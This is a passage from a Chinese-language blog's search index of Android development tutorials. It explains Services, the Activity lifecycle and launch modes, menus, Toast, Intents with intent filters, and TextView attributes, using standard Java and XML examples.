android:enabled=&quot;true&quot; android:exported=&quot;true&quot;&gt;&lt;/service&gt; ...... &lt;/application&gt;&lt;/manifest&gt; Activity 与 Service 通信Activity 与 Service 之间的交流媒介是 Service 中的 onBind() 方法，它带有 Intent 参数，并且返回值为 IBinder，也就是说，可以通过 IBinder 来传递数据。 实现步骤如下： 在自定义 Service 类中，自定义一个 Binder 类，将要暴露的方法写到该类中，同时实例化这个类。 然后重写 onBind()方法，将这个 Binder 对象返回。 在调用该 Service 的 Activity 中，实例化一个 ServiceConnection 对象，重写 onServiceConnected() 方法来获取 Binder 对象，之后调用相关方法即可！ 简单的前台服务通常情况下，Service 都是运行在后台的。但是 Service 的系统优先级比较低，如果系统内存不足，就有可能回收正在后台运行的 Service。 那如何解决上述情况呢？我们可以使用前台服务，从而让 Service 被杀死的可能性降低，所谓的前台服务就是状态栏显示的 Notification。 实现方法：在自定义的 Service 类中重写 onCreate()，根据自己的需求定制 Notification，最后调用 startForeground(id,notification) 即可。","categories":[],"tags":[],"keywords":[]},{"title":"Andriod_development_activity","slug":"Andriod-development-activity","date":"2024-09-15T02:09:43.000Z","updated":"2024-11-11T09:24:28.505Z","comments":true,"path":"2024/09/15/Andriod-development-activity/","link":"","permalink":"http://example.com/2024/09/15/Andriod-development-activity/","excerpt":"","text":"Activity介绍Activity（活动）是一个核心的组件，负责应用界面的呈现和用户交互。每个 Activity 通常表示应用中的一个屏幕，比如一个登陆页面、设置页面、或图片查看页面。Activity 管理用户操作的生命周期和状态变更，同时也负责在屏幕上显示 UI 并响应用户输入。 Activity 是 Android 应用中的基本单元，每一个 Activity 代表应用的一个“页面”或“任务”。一个 Android 应用可以由多个 Activity 组成，它们通过 Intent 进行交互和导航。在 Android 中，Activity 是通过继承 android.app.Activity 类来创建的，Andorid 应用中每个 Activity 都必须在 AndroidManifest.xml 配置文件中进行注册，否则系统将不识别也不执行该 Activity。 活动流程创建活动创建一个 activity 配置 app&#x2F;src&#x2F;main&#x2F;java&#x2F;com.example.Nactivity 目录是空的，创建一个 activity，New-&gt; Activity-&gt; Empty viw Activity 前两个选项不选。勾选上第一个表示自动为 FirstActivity 创建一个对应的布局文件，勾选第二个表示会自动将 FirstActivity 设置为当前项目的主活动。 123456789101112131415161718package com.example.nactivity;import android.os.Bundle;import androidx.activity.EdgeToEdge;import androidx.appcompat.app.AppCompatActivity;import androidx.core.graphics.Insets;import androidx.core.view.ViewCompat;import androidx.core.view.WindowInsetsCompat;public class FirstActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.first_layout); &#125;&#125; 创建和加载布局Android 程序设计讲究的是逻辑和视图分离，每个活动最好都能对应一个布局，而布局就是用来显示界面内容的，因此我们现在手动创建一个布局文件 右击 app&#x2F;src&#x2F;main&#x2F;res 目录 →New→Directory, 会弹出一个新建目录的窗口, 这里先创建一个名为 layout 的目录。然后对着 layout 目录右键 →Layout resource file, 又会弹出一个新建布局资源文件的窗口, 我们将这个布局文件命名为 first_layout, 根元素就默认选择为 LinearLayout。 Design 是当前的可视化布局编辑器，在这里可以预览当前的布局，也可以通过拖放的方式编辑布局。而 Code 里面存放的是 XML 方式来编辑布局。这里我们添加一个 button 1。 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;Button android:id=&quot;@+id/button1&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Button 1&quot; tools:ignore=&quot;MissingConstraints&quot; /&gt;&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt; android: id 定义了一个唯一标识符，@+id&#x2F;id_name 是用来定义一个 id。 android: layout_width 指定当前 button 的宽度，match_parent 是让它和父元素一样宽。 android: layout_height 指定当前 button 的高度，wrap_content 表示 button 高度只要能刚好包含里面的内容就行。 android: text 指定 button 中显示的文字内容。 在 onCreate 中增加 setContentView;，用来给当前活动加载一个布局，而它的参数是一个布局文件的 id。 1setContentView(R.layout.first_layout); AndroidManifest.xml 中注册所有的活动都要在 AndroidManifest.xml 中进行注册才能生效，而实际上 NActivity 已经在 AndroidManifest.xml 中注册过了 1234567891011121314151617181920&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot;&gt; &lt;application android:allowBackup=&quot;true&quot; android:dataExtractionRules=&quot;@xml/data_extraction_rules&quot; android:fullBackupContent=&quot;@xml/backup_rules&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/Theme.Nactivity&quot; tools:targetApi=&quot;31&quot;&gt; &lt;activity android:name=&quot;.FirstActivity&quot; android:exported=&quot;false&quot; /&gt; &lt;/application&gt;&lt;/manifest&gt; 可以看到活动的注册声明要放在 application 里面，这里通过标签来对活动进行注册的，这个注册环节是 Android Studio 自动帮我们完成的。 android: name 指定具体注册哪一个活动.FirstActivity 是 com.example.activitytest.FirstActivity 的缩写。 可是目前程序还是不能跑起来的，因为我们还没有指定主活动，也就是说程序运行起来时，不知道首先启动哪个活动。 添加如下代码，然后启动 1234&lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;&lt;/intent-filter&gt; android: label 显示在左上角，中间就是 layout 布局文件的效果 在活动中使用 ToastToast 是 Android 系统中提供的一种非常好的提醒方式，在程序中可以使用它将一些短小的信息通知给用户，这些信息会在一段时间后自动消失，并且不占用任何屏幕空间。 12345678910111213141516171819202122232425262728package com.example.nactivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.Toast;import androidx.activity.EdgeToEdge;import androidx.appcompat.app.AppCompatActivity;import androidx.core.graphics.Insets;import androidx.core.view.ViewCompat;import androidx.core.view.WindowInsetsCompat;public class FirstActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.first_layout); Button button1=(Button)findViewById(R.id.button1); button1.setOnClickListener(new View.OnClickListener() &#123; public void onClick(View view) &#123; Toast.makeText(FirstActivity.this, &quot;Click The Button!&quot;, Toast.LENGTH_SHORT).show(); &#125; &#125;); &#125;&#125; 我们首先通过 findViewById 获得按钮的实例，findViewById 返回值是一个 View 对象，需要我们向下转型为 Button 对象。在得到实例后，通过调用 setOnClickListener 为按钮注册一个监听器，点击按钮时会执行监听器中的 onClick 方法，因此 Toast 的弹出需要在 onClick 方法中编写。第一个参数是 Context, 也就是 Toast 要求的上下文, 由于活动本身就是一个 Context 对象, 因此这里直接传入 FirstActivity.this 即可。第二个参数是 Toast 显示的文本内容, 第三个参数是 Toast 显示的时长, 有两个内置常量可以选择 Toast, LENGTH SHORT 和 Toast.LENGTH LONG。 在活动中使用 Menu由于手机的屏幕空间十分有限，因此要充分利用屏幕空间在手机界面设计中就显得非常重要了，可能有时候大量的菜单就占了屏幕 1&#x2F;3 的空间，不过安卓给我们提供了一种方式，不仅可以让菜单都得到展示的同时，还不用占用任何屏幕空间。 首先在 res 目录下新建一个 menu 文件夹。接着在这个文件夹下再新建一个名叫 main 的菜单文件, 右击 menu 文件夹 →New→Menu resource file, 接下来我们需要在 main.xml 中添加以下代码 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;menu xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;&lt;item android:id=&quot;@+id/add_item&quot; android:title=&quot;Add&quot; /&gt;&lt;item android:id=&quot;@+id/remove_item&quot; android:title=&quot;Remove&quot; /&gt;&lt;/menu&gt; 这里我们创建了两个菜单项，其中标签就是用来创建具体的某一个菜单项，然后通过 android: id 给这个菜单项指定一个唯一的标识符，通过 android: title 给这个菜单项指定一个名称。 接下来回到 FirstActivity 中来重写 onCreateOptionsMenu()方法，快捷键 Ctrl+O 1234public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.main,menu); return true; &#125; 通过 getMenuInflater 方法能够得到 MenuInflater 对象，再调用它的 inflate 方法就可以给当前活动创建菜单了。 inflate 有两个参数，第一个参数用于指定我们通过哪一个资源文件来创建菜单，这个传入 R.menu.main，第二个参数用于指定我们的菜单项将添加到哪一个 Menu 对象中，这里直接用 onCreateOptionsMenu 传入的 menu，然后返回 true，表示允许创建的菜单显示出来，如果返回了 false，创建的菜单将无法显示。 当然，仅仅让菜单显示出来肯定还不够，我们需要让菜单真正能用才行，因此还要再定义菜单响应事件，在 FirstActivity 中重写 onOptionsItemSelected 方法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.example.nactivity;import android.annotation.SuppressLint;import android.os.Bundle;import android.view.Menu;import android.view.MenuItem;import android.view.View;import android.widget.Button;import android.widget.Toast;import androidx.annotation.NonNull;import androidx.activity.EdgeToEdge;import androidx.appcompat.app.AppCompatActivity;import androidx.core.graphics.Insets;import androidx.core.view.ViewCompat;import androidx.core.view.WindowInsetsCompat;public class FirstActivity extends AppCompatActivity &#123; @Override public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.main,menu); return true; &#125; @Override public boolean onOptionsItemSelected(@NonNull MenuItem item) &#123; int itemId = item.getItemId(); //Resource IDs will be non-final by default in Android Gradle Plugin version 8.0 if (itemId == R.id.add_item) &#123; Toast.makeText(this, &quot;You click Add&quot;, Toast.LENGTH_SHORT).show(); &#125; else if (itemId == R.id.remove_item) &#123; Toast.makeText(this, &quot;You click Remove&quot;, Toast.LENGTH_SHORT).show(); &#125; return true; &#125; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.first_layout); Button button1=(Button)findViewById(R.id.button1); button1.setOnClickListener(new View.OnClickListener() &#123; public void onClick(View view) &#123; Toast.makeText(FirstActivity.this, &quot;You Click The Button!&quot;, Toast.LENGTH_SHORT).show(); &#125; &#125;); &#125;&#125; 销毁一个活动如果你不想通过按建的方式, 而是希望在程序中通过代码来销毁活动, 当然也可以, Activity 类提供了一个 finish()方法, 我们在活动中调用一下这个方法就可以销毁当前活动了。 123456button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; finish(); &#125;&#125;）； 生命周期每个 Activity 都有自己的生命周期，管理其状态的生命周期回调方法被系统自动调用。Activity 类中定义了 7 个回调方法，覆盖了活动生命周期的每一个环节。 回调方法（Callback Method）是 Android 框架调用的特定方法，开发者通过实现或重写这些方法来定制组件的行为和响应特定事件。Android 系统会根据组件的状态、生命周期或用户的操作自动调用这些回调方法，这样开发者不需要在每个时刻显式监控和控制应用状态变化，而只需在特定的方法中实现相应的逻辑。 onCreate&#x2F;&#x2F; 响应点击事件 当 Activity 首次创建时调用，仅在 Activity 生命周期中调用一次。在这个方法中完成活动的初始化操作，比如说加载布局、绑定事件等。 onStart&#x2F;&#x2F; 进行资源准备，例如更新界面内容 在 onCreate() 之后或从“停止”状态恢复时调用。此时 Activity 即将对用户可见。在 onStart() 中，Activity 从后台进入前台，但还没有进入可交互状态。此时适合准备即将显示的资源，例如更新界面元素的内容。 onResume&#x2F;&#x2F; 开始接收用户输入、动画等 在 onStart() 之后调用，表示 Activity 进入“运行”状态，此时用户可以与之交互。在此方法中，Activity 完全进入前台并获得焦点，可以接收用户输入。适合在此开启动画、视频或音频播放等需要用户直接交互的内容。 onPause&#x2F;&#x2F; 暂停耗资源的操作，例如动画、音频 当 Activity 即将进入“停止”状态或系统要启动其他 Activity 时调用。在 onPause() 中，可以释放与用户交互相关的资源，暂停动画或视频，并确保数据的保存。Activity 在“暂停”状态仍然可见，但失去焦点，不再与用户交互。由于随时可能调用 onStop()，建议在此方法中保存当前状态，以便系统回收时数据不丢失。 onStop &#x2F;&#x2F; 释放大资源，避免内存占用 当 Activity 对用户完全不可见时调用。适合释放不再需要的资源（如取消网络请求、释放数据库或大图资源等），防止内存泄漏。可以在 onStop() 中保存状态，以备下次启动时恢复。 onDestory&#x2F;&#x2F; 清理资源，释放内存，取消监听器 在 Activity 被销毁之前调用，可能是因为系统需要回收内存，或者用户退出。用于彻底清理 Activity，释放所有资源，例如取消注册的监听器、关闭线程或清理后台任务。onDestroy() 在生命周期的结束阶段调用，意味着 Activity 即将被完全回收。 onRestart&#x2F;&#x2F; 重新加载资源或状态，更新界面 当 Activity 从“停止”状态重新启动，进入可见状态之前调用。适合在重新启动 Activity 前做准备工作，例如重新加载数据或刷新界面。通常会在 onStart() 之前调用，是 Activity 从不可见到可见的过渡状态。 上述图片中，存在三个周期： 整个的生命周期：onCreate() → onStart() → onResume() → Activity running → onPause() → onStop() → onDestory() 可见的生命周期：onStart() → onResume() → Activity running → onPause() → onStop() → onRestart() 前台的生命周期：onResume() → Activity running → onPause() Activity 栈Activity栈（Activity Stack）是 Android 系统中用于管理 Activity 之间导航和生命周期的重要机制。它以栈的形式维护应用的不同 Activity，使得用户可以通过返回操作逐步返回到之前的 Activity。 四种状态 运行状态（Active&#x2F;Running） 定义：当 Activity 位于栈顶并显示在前台时，它处于“运行”状态。 特点：用户可以直接与之交互，Activity 的界面可见且拥有焦点。 生命周期：处于 onResume() 方法之后，直到 Activity 失去焦点或被其他 Activity 覆盖。 暂停状态（Paused） 定义：当 Activity 仍然部分可见，但失去焦点时，它进入“暂停”状态。 特点：虽然 Activity 部分显示在前台，但由于被半透明的 Activity（如对话框）或新 Activity 部分覆盖，用户无法与之交互。 生命周期：调用 onPause() 方法，但没有调用 onStop()，这意味着系统保留了 UI 和数据状态。 停止状态（Stopped） 定义：当 Activity 完全不可见且被其他 Activity 覆盖时，它进入“停止”状态。 特点：Activity 完全离开了前台，但系统会保留它在内存中的状态（如用户输入的数据）。 生命周期：调用 onStop() 方法。Activity 在后台待命，可以被用户通过返回键或任务管理器重新唤醒。 销毁状态（Destroyed） 定义：当 Activity 被系统回收或用户退出时，Activity 进入“销毁”状态。 特点：Activity 被彻底清理，系统会调用 onDestroy() 方法，释放所有资源和数据。 生命周期：调用 onDestroy() 方法后，Activity 完全消失，无法恢复状态。若用户重新打开该 Activity，会重新创建。 活动的启动模式 standard 这是默认的启动模式。每次启动一个 Activity 时，都会创建该 Activity 的新实例，并将其推入当前任务栈（task stack）中。在 standard 模式（即默认情况）下，每当启动一个新的活动，它就会在返回栈中入栈，并处于栈顶的位置。对于使用 standard 模式的活动，系统不会在乎这个活动是否已经在返回栈中存在，每次启动都会创建该活动的一个新的实例。默认无需指定 launchMode，如果不设置 launchMode，系统会自动采用 standard 模式。 singleTop 当启动一个 Activity 时，如果该 Activity 已经位于栈顶，则不会创建新的实例，而是重用栈顶的实例。否则，创建新的实例并将其压入栈中。如果栈顶已有目标 Activity 实例，则重用该实例并调用其 onNewIntent() 方法；否则，创建新的 Activity 实例。适用于需要避免重复创建 Activity 实例的场景，尤其是在不希望多个相同页面堆积在栈中的情况。例如，某些页面如新闻列表页，每次点击一个项目时，我们希望直接跳转到目标页面，而不希望栈中堆积多个相同的页面。 Manifest 声明： 1&lt;activity android:name=&quot;.MainActivity&quot; android:launchMode=&quot;singleTop&quot; /&gt; singleTask 该模式启动的 Activity 会在一个新的任务栈中运行（如果没有其他 Activity 实例与其重叠）。如果栈中已经存在该 Activity 的实例，系统会销毁栈中该 Activity 上面的所有 Activity，并重新将该 Activity 实例带到前台。当启动目标 Activity 时，如果该 Activity 已经存在于任务栈中，系统将删除栈中该 Activity 之上的所有 Activity，并将目标 Activity 带到前台。新的任务栈会包含这个 Activity 的实例。适用于需要单一实例且确保全局唯一的 Activity，常用于应用的主界面或者登录界面。它有助于控制多个页面之间的导航，避免重复的 Activity 实例。 Manifest 声明： 1&lt;activity android:name=&quot;.MainActivity&quot; android:launchMode=&quot;singleTask&quot; /&gt; singleInstance 这种模式与 singleTask 类似，不同之处在于该 Activity 会在一个独立的任务栈中运行，而且任务栈中只能包含一个 Activity 实例。即使栈中已经有该 Activity 实例，也会创建新的任务栈，并且该栈只能包含一个 Activity 实例。每次启动该 Activity 时，它都会创建一个新的任务栈，并且该栈只包含该 Activity 实例。其他所有 Activity 都不能和该 Activity 实例共享一个栈。通常用于特殊场景，例如需要独立管理的 Activity（如应用中的设置界面、系统界面等），确保该 Activity 始终只有一个实例并运行在独立的栈中。 在这种模式下会有一个单独的返回栈来管理这个活动，不管是哪个应用程序来访问这个活动，都共用的同一个返回栈 IntentIntent 是一个用于在应用组件之间传递信息的对象。Intent 可以启动 Activity、Service，甚至可以用于广播传递数据。它是 Android 系统中实现组件间通信的核心机制。 显示 Intent显式指定目标组件的名称。常用于应用内部组件之间的调用，比如从一个 Activity 启动另一个 Activity。 使用方法 首先按照之前的方法再创建一个 activity，仍然还是右击 com.example.activitytest 包 →New→Activity→Empty view Activity, 会弹出一个创建活动的对话框, 我们这次将活动命名为 SecondActivity, 并勾选 Generate Layout File, 给布局文件起名为 second_layout, 但不要勾选 Launcher Activitv 选项, 我们添加一个 button2 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; tools:context=&quot;.SecondActivity&quot;&gt; &lt;Button android:id=&quot;@+id/button2&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Button 2&quot; /&gt;&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt; SecondActivity 已经帮我们生成好了一部分代码，当然，要记得任何一个活动创建后都要在 AndroidManifest.xml 中注册，不过 Android Studio 已经帮我们自动完成了 1234567891011121314151617181920212223242526272829303132&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; &gt; &lt;application android:allowBackup=&quot;true&quot; android:dataExtractionRules=&quot;@xml/data_extraction_rules&quot; android:fullBackupContent=&quot;@xml/backup_rules&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/Theme.Nactivity&quot; tools:targetApi=&quot;31&quot; &gt; &lt;activity android:name=&quot;.SecondActivity&quot; android:exported=&quot;false&quot; android:label=&quot;This is my SecondActivity&quot; /&gt; &lt;activity android:name=&quot;.FirstActivity&quot; android:exported=&quot;true&quot; android:label=&quot;This is my FirstActivity&quot; &gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; 由于 SecondActivity 不是主活动，所以不用 标签设置启动，现在我们只差一步了：如何启动第二个活动了，这里就需要 Intent 了。 Intent 有多个构造函数的重载，其中有一个是 Intent(Context packageContext, Class &lt;?&gt; cls)。这个函数接受两个参数，第一个参数是要求提供一个启动活动的上下文，第二个参数 Class 则是指定想要启动的目标活动，由于 Intent 只是指明当前组件想要执行的动作，属于意图，所以我们还得使用 startActivity 方法，这个方法是专门用于启动活动的，它的参数是 intent，代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.example.activitytest;import androidx.annotation.NonNull;import androidx.appcompat.app.AppCompatActivity;import android.content.Intent;import android.os.Bundle;import android.view.Menu;import android.view.MenuItem;import android.view.View;import android.widget.Button;import android.widget.Toast;public class FirstActivity extends AppCompatActivity &#123; @Override public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.main,menu); return true; &#125; @Override public boolean onOptionsItemSelected(@NonNull MenuItem item) &#123; switch (item.getItemId())&#123; case R.id.add_item: Toast.makeText(this, &quot;You click Add&quot;, Toast.LENGTH_SHORT).show(); break; case R.id.remove_item: Toast.makeText(this, &quot;You click Remove&quot;, Toast.LENGTH_SHORT).show(); break; default: &#125; return true; &#125; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.first_layout); Button button1=findViewById(R.id.button1); button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View view) &#123; Toast.makeText(FirstActivity.this, &quot;You Click The Button!&quot;, Toast.LENGTH_SHORT).show(); Intent intent =new Intent(FirstActivity.this,SecondActivity.class); startActivity(intent); &#125; &#125;); &#125;&#125; 当我们启动 App 后，点击 Button1 会启动 SecondActivity，当我们再按 back 键后，就会销毁 SecondActivity，退回到 FirstActivity。由于 Intent 的意图非常明显，所以我们称之为显式 Intent。 隐式 Intent不指定目标组件的名称，而是通过 Action、Category 和 Data 来描述要执行的操作。系统会根据 Intent 的描述来查找能够响应此 Intent 的组件。常用于调用其他应用的功能，如打开浏览器、拨打电话等。 createChooser 如果有多个应用响应隐式 Intent，则系统会弹出对话框，让用户选择要使用的应用，用户也可以将某个应用设置为该操作的默认选项。如果想让用户无法选择用于操作的应用，而强制使用某个应用响应该操作时，可以使用强制选择器： Android 提供了 Intent.createChooser() 方法，用来创建强制选择器。该方法返回一个 Chooser Intent，强制系统显示选择器对话框。 1234567Intent sendIntent = new Intent(Intent.ACTION_SEND);//创建了一个 Intent 对象 sendIntent，并设置操作类型为 ACTION_SEND，表示我们想要分享内容sendIntent.setType(&quot;text/plain&quot;);//sendIntent.putExtra(Intent.EXTRA_TEXT, &quot;Hello! This is a message.&quot;);// 使用 createChooser() 强制显示选择器Intent chooser = Intent.createChooser(sendIntent, &quot;请选择应用进行分享&quot;);//将 sendIntent 作为参数传入 createChooser()方法，同时指定选择器的标题（如 &quot;请选择应用进行分享&quot;）startActivity(chooser);//使用 startActivity(chooser)启动选择器。即使系统中只有一个应用可以处理该 Intent，这个方法仍然会显示选择器对话框，让用户确认使用哪个应用。 属性Intent 在 Android 中是一个用于在不同应用组件之间传递数据的关键对象。通过 Intent 的属性，可以详细描述要执行的操作，并传递执行该操作所需的数据。 Action 作用：Action 属性用于描述 Intent 的目的，指示要执行的操作类型。比如查看网页、拨打电话、发送短信等。 使用：Action 通常是一个字符串常量，系统和应用可以通过它来确定要执行的操作。 action 常量地址：https://developer.android.google.cn/guide/components/intents-common?hl &#x3D; zh-cn Data 作用：Data 属性用于指定要操作的数据的 URI。例如，如果 Action 是 ACTION_VIEW，Data 可以指定一个网页的 URI 或者图片的 URI。 使用：通过 setData() 方法设置数据。Data 与 Action 配合使用，描述了该 Intent 将要处理的数据。 Category 作用：Category 提供关于 Intent 额外的执行信息，指定该 Intent 的目标类型。例如，可以指定该 Intent 的类型是启动器应用还是浏览器。 使用：通过 addCategory(String category) 方法添加 Category。一般来说，一个 Intent 可以包含多个 Category。 Component 作用：Component 用于指定 Intent 的目标组件。通过该属性，可以显式指定要启动的 Activity 或 Service。 使用：通过 setComponent() 方法设置，或者直接在构造函数中传入目标组件。 Extras 作用：Extras 用于在 Intent 中存储附加数据，是键值对（key-value）形式的附加信息。常用于在组件之间传递复杂数据，如字符串、布尔值、对象等。 使用：通过 putExtra() 方法添加数据，通过 getExtra() 方法获取数据。 Flags 作用：Flags 用于描述 Intent 的行为和启动模式。通过设置不同的标志，可以控制 Intent 的启动方式，比如是否创建新任务栈、是否清除任务栈等。 使用：通过 addFlags() 方法添加标志。 Type 作用：Type 指定数据的 MIME 类型，用于告诉系统如何解释 Intent 中携带的数据。与 Data 结合使用时非常有用，比如指定要打开的数据类型。 使用：通过 setType(String type) 方法设置。 Intent 过滤器1 Intent 过滤器（Intent Filter）是用于定义组件（Activity、Service、BroadcastReceiver）可以响应哪些 Intent 的机制。它位于 AndroidManifest.xml 中，用来描述组件对某些特定 Intent 的响应能力，从而让系统知道哪些组件能够处理给定的 Intent。 通过设置 Intent 过滤器，应用可以实现组件之间的灵活交互，甚至支持隐式 Intent，从而允许其他应用调用该组件的功能。 Intent Filter 的组成一个 Intent 过滤器主要由以下三部分组成：&lt;action&gt;、&lt;category&gt; 和 &lt;data&gt;，这三部分共同定义了该组件可以处理哪些 Intent。 1234567891011121314151617&lt;activity android:name=&quot;ShareActivity&quot;&gt; &lt;!-- This activity handles &quot;SEND&quot; actions with text data --&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.SEND&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;data android:mimeType=&quot;text/plain&quot;/&gt; &lt;/intent-filter&gt; &lt;!-- This activity also handles &quot;SEND&quot; and &quot;SEND_MULTIPLE&quot; with media data --&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.SEND&quot;/&gt; &lt;action android:name=&quot;android.intent.action.SEND_MULTIPLE&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;data android:mimeType=&quot;application/vnd.google.panorama360+jpg&quot;/&gt; &lt;data android:mimeType=&quot;image/*&quot;/&gt; &lt;data android:mimeType=&quot;video/*&quot;/&gt; &lt;/intent-filter&gt;&lt;/activity&gt; &lt;action&gt; 作用：&lt;action&gt; 指定了组件能够响应的操作类型。Action 是一个字符串常量，用来标识该 Intent 的基本目的。 Intent 只能设置一个 action，但一个 Intent 过滤器可以声明多个 action。只要 Intent 中的 action 与 Intent 过滤器的某一项 action 匹配，就可以通过 action 测试。 &lt;category&gt; 作用：&lt;category&gt; 提供关于 Intent 的额外信息，用于进一步描述组件可以处理的特定类型的 Intent。对于大多数 Intent 过滤器，必须包含 CATEGORY_DEFAULT，它表示该组件能够处理由系统启动的 Intent Intent 可以包含多项 category，Intent 过滤器也可以包含多项 category。Intent 中的每项 category 必须在 Intent 过滤器中都有对应项，才能通过 category 测试。 &lt;data&gt; 作用：&lt;data&gt; 用于描述组件能够处理的数据类型，包括 URI 和 MIME 类型的组合。&lt;data&gt; 标签可以设置数据的 scheme、host、port、path 等参数，用于更加精确地过滤数据。 URI 匹配规则 URI 的格式为 &lt;scheme&gt;://&lt;host&gt;:&lt;port&gt;/&lt;path&gt;，上述每个属性均为可选，但存在线性依赖关系： 如果未指定 scheme，则会忽略 host。 如果未指定 host，则会忽略 port。 如果未指定 scheme 和 host，则会忽略 path Intent Filter 的匹配规则系统在查找可以处理 Intent 的组件时，会通过以下三步进行匹配： Action 匹配：Intent 的 action 和过滤器中的 &lt;action&gt; 必须匹配。 Category 匹配：Intent 的 category 和过滤器中的 &lt;category&gt; 必须完全匹配。Intent 中可能有多个 Category，而 Intent Filter 的所有 Category 都必须在 Intent 中包含。 Data 匹配：Intent 的 data 和过滤器中的 &lt;data&gt; 部分必须匹配。系统会根据 scheme、host、port、path、mimeType 等属性匹配数据。 Intent 数据传递在 Android 中，Intent 用于在应用的不同组件（如 Activity、Service、BroadcastReceiver）之间传递数据。数据传递是 Intent 的一项重要功能，它允许在不同的组件之间共享信息，从而实现灵活的组件交互。Intent 可以通过 Extras 属性以键值对的形式传递各种类型的数据。 Intent 数据传递的方式主要有两种数据传递方式： 基本数据类型传递：直接通过 putExtra 方法传递单个数据项，如字符串、整型、布尔值等。 复杂数据类型传递：通过传递 Bundle、Serializable 对象、Parcelable 对象等，进行更复杂的数据传递。 Intent 数据回传在一个 Activity 启动另一个 Activity，然后接收返回的数据。通常使用 startActivityForResult() 方法启动目标 Activity，并在返回时通过 onActivityResult() 方法获取结果数据。 从 Android 11（API Level 30）开始，谷歌推荐使用 ActivityResult API 代替 startActivityForResult()，更安全和易于管理。 待定 Intent“待定 Intent”（PendingIntent）是一种特殊的 Intent，允许另一个应用或系统组件在特定情况下代替应用程序执行一个 Intent。PendingIntent 通常用于延迟执行操作。 PendingIntent 的相关方法 getActivity()：返回一个启动 Activity 的 PendingIntent。 getService()：返回一个启动 Service 的 PendingIntent。 getBroadcast()：返回一个发送广播的 PendingIntent。 cancel()：取消当前的 PendingIntent。 send()：发送当前的 PendingIntent。","categories":[],"tags":[],"keywords":[]},{"title":"Andriod-development-UI","slug":"Andriod-development-UI","date":"2024-09-10T02:23:46.000Z","updated":"2024-11-11T09:24:22.193Z","comments":true,"path":"2024/09/10/Andriod-development-UI/","link":"","permalink":"http://example.com/2024/09/10/Andriod-development-UI/","excerpt":"","text":"Android 的 UI 开发一般采用 XML 代码编写 控件TextViewTextView 是最常用的控件之一，用于显示文本内容。它是 Android 提供的基础文本控件，可以显示单行或多行文本，并支持多种样式和事件。 基本属性 属性 说明 layout_width 设置控件的宽度，常用的有”wrap_content”(根据控件内容适配)、”match_parent”(与父容器同宽)，以及确切数字，如 200 dp layout_height 设置控件的高度。 id 格式为”@+id&#x2F;xxx”用于在代码中获取该对象，只需通过 findViewById ( R.id.xxx ) 即可获取到该控件。 text 设置文字内容 textColor 设置文字颜色，格式可以为”#xxxxxxxx”，前两位代表颜色的透明度（00 透明，FF 不透明），后面代表 RGB textStyle 设置文字风格，如 normal(无效果)，bold(加粗)，italic(斜体) textSize 设置文字大小，单位 sp background 设置控件背景颜色，”#xxxxxxxx”的格式同 textColor 一样，也可以是图片背景 gravity 控制文本在 TextView 内部的对齐方式，如 center、left、right 